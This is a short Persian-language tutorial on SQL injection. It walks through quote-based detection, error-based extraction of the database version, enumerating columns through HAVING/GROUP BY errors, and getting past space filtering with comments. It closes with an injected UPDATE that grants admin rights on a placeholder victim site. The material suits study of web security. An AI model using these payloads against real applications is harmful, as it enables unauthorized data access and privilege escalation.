<div dir="rtl" style="font-size:18px; text-align: justify">
در هر برنامه ای که ورودی داده های کاربر را می پذیرد و سپس این ورودی ها برای دسترسی به سرور پایگاه داده استفاده میشود
</div>

<div dir="rtl" style="font-size:18px; text-align: justify">
کاربر میتواند با تغییر کوکی ها یا header ها یا user-agent حمله ای به برنامه ما ترتیب دهد
</div>

<div dir="rtl" style="font-size:18px; text-align: justify">
اگر با یک مقدار که کاربر وارد میکند و خروجی خطا را به شما بازگردانده است یعنی برنامه راه کار مناسبی برای مدیریت داده های غیر منتظره استفاده نمیکند
</div>

```djangourlpath
http://vigtim.com/?category=attacker'
```

<div dir="rtl" style="font-size:18px; text-align: justify">
البته هر خطایی که برنامه میده لزما بر این نیست که برنامه بازه برای حمله sql-injection
</div>


<div dir="rtl" style="font-size:18px; text-align: justify">
کاربرد کوتیشن (') برای تشخیص آسیب پذیری:
</div>

```djangourlpath
http://vigtim.com/?category=bikes
http://vigtim.com/?category=bi''kes
```
<div dir="rtl" style="font-size:18px; text-align: justify">
اگر نتیجه نهایی هردو خروجی یکسان باشد یعنی خطا sql-injection وجود دارد.
</div>

<div dir="rtl" style="font-size:18px; text-align: justify">
با استفاده از database error میتوانیم اطلاعات مهم دیتابیس با توابع خود دیتابیس بفهمیم. مثل:
</div>

```djangourlpath
http://vigtim.com/?category=bikes' and 1=0/@version;--
```
<div dir="rtl" style="font-size:18px; text-align: justify">
این کار باعث میشه که یک خطا رخ بده چون تقسیم عدد صفر بر یک مقدار str باعث ایجاد خطا میشود و داخل اون خطا مقدار version@ برگردانده میشود.
</div>

<div dir="rtl" style="font-size:18px; text-align: justify">
یا اینکه میتونیم از دستورات خود SQL استفاده کنیم.
</div>

```djangourlpath
http://vigtim.com/?category=bikes' or having 1'='1
```

<div dir="rtl" style="font-size:18px; text-align: justify">
کویری بالا هم باعث ایجاد خطا میشود چون میگه که باید کویری group by داشته باشه که تو متن خطا میتونیم فیلد های استفاده شده تو select رو بفهمیم
</div>

<div dir="rtl" style="font-size:18px; text-align: justify">
با استفاده از اعداد و رشته های خاص میتوانیم این حمله رو انجام دهیم:
</div>

`
value' or '1' = '2
`

`
value' or 'ab' = 'a''b
`
<div dir="rtl" style="font-size:18px; text-align: justify">
میتوانیم از کامنت گذاری استفاده کنیم:
</div>

```djangourlpath
http://vigtim.com/?uid=45/* hello */
```
<div dir="rtl" style="font-size:18px; text-align: justify">
اگر برنامه فاصله را به صورت خودکار حذف کنه میتونیم با استفاده از کامنت این حذف فاصله رو دور بزنیم.
</div>

```djangourlpath
http://vigtim.com/?uid=45/* */ or /* */ 1=1
```

<div dir="rtl" style="font-size:18px; text-align: justify">
اول باید تمام فیلدهای داخل select را بدست بیارم:
</div>

```djangourlpath
http://vigtim.com/?uid=45;selct * from users having 1=1;--
```

<div dir="rtl" style="font-size:18px; text-align: justify">
همینطور ادامه میدیم تا همه فیلدها را بدست بیاریم
</div>

```djangourlpath
http://vigtim.com/?uid=45;selct * from users group by uid having 1=1;--
http://vigtim.com/?uid=45;selct * from users group by uid,user having 1=1;--
http://vigtim.com/?uid=45;selct * from users group by uid,user,is_admin having 1=1;--
...
```

<div dir="rtl" style="font-size:18px; text-align: justify">
بعد از شناسایی تمام ستون ها با این دستور:
</div>

```djangourlpath
http://vigtim.com/?uid=45;update users set is_admin = 1 where uid = 45;
```